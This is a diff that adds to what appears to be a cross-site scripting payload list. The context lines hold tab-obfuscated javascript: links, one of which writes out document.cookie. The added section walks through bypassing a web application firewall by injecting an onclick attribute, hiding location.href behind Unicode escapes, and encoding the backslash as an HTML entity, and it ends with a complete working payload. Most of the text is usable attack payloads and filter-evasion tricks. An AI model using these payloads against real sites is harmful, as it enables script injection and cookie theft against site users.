@@ -15,3 +15,30 @@
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write('<marquee>Hello, World!</marquee>')">XSS</a>
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.cookie)">XSS</a>
 <a href="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:document.write(document.domain)">XSS</a>
+
+𝐗𝐒𝐒 𝐛𝐲𝐩𝐚𝐬𝐬 𝐮𝐬𝐢𝐧𝐠 𝐔𝐧𝐢𝐜𝐨𝐝𝐞 𝐞𝐬𝐜𝐚𝐩𝐞 𝐰𝐢𝐭𝐡 𝐇𝐓𝐌𝐋 𝐄𝐧𝐭𝐢𝐭𝐢𝐞𝐬.
+
+
+𝐕𝐮𝐥𝐧 :
+<input id="test" name="test" value="[𝗽𝗮𝘆𝗹𝗼𝗮𝗱 𝗵𝗲𝗿𝗲]"></input>
+
+𝟏. " 𝐨𝐧𝐜𝐥𝐢𝐜𝐤=𝐥𝐨𝐜𝐚𝐭𝐢𝐨𝐧.𝐡𝐫𝐞𝐟="𝐣𝐚𝐯𝐚𝐬𝐜𝐫𝐢𝐩𝐭:𝟏">
+First try, 𝗼𝗻𝗰𝗹𝗶𝗰𝗸 (event handler) passes. However, 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻.𝗵𝗿𝗲𝗳 does not pass and is blocked by waf.
+
+𝟐. " 𝐨𝐧𝐜𝐥𝐢𝐜𝐤=𝐥\𝐮{𝟔𝐅}𝐜𝐚𝐭𝐢\𝐮{𝟔𝐅}𝐧.𝐡𝐫𝐞𝐟="𝐣𝐚𝐯𝐚𝐬𝐜𝐫𝐢𝐩𝐭:𝟏">
+Second try, bypassing 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻.𝗵𝗿𝗲𝗳 with unicode escape. \𝘂{𝟲𝗙} is the unicode escape of the letter 𝗼.
+
+Payload bypass 𝗹𝗼𝗰𝗮𝘁𝗶𝗼𝗻.𝗵𝗿𝗲𝗳 with unicode escape successfully passed. However, our payload gets output like
+
+"𝗼𝗻𝗰𝗹𝗶𝗰𝗸=𝗹\\𝘂{𝟲𝗙}𝗰𝗮𝘁𝗶\\𝘂{𝟲𝗙}𝗻.𝗵𝗿𝗲𝗳=>
+
+When we added a backslash from the previous unicode escape, the web app automatically added another backslash which caused our payload to not work.
+
+𝟑. " 𝐨𝐧𝐜𝐥𝐢𝐜𝐤=𝐥&#𝟗𝟐;𝐮{𝟔𝐅}𝐜𝐚𝐭𝐢&#𝟗𝟐;𝐮{𝟔𝐅}𝐧.𝐡𝐫𝐞𝐟="𝐣𝐚𝐯𝐚𝐬𝐜𝐫𝐢𝐩𝐭:𝟏">
+Our next experiment bypassed the backslash using the HTML Entities encode. &#𝟵𝟮; is the HTML Entities encode of the backslash.
+
+Our payload passes and the XSS is successfully triggered on the Firefox browser.
+
+
+𝐅𝐮𝐥𝐥 𝐩𝐚𝐲𝐥𝐨𝐚𝐝:
+" onclick​=l&#92;u{6F}cati&#92;u{6F}n.href="javascript​:alert(1)">
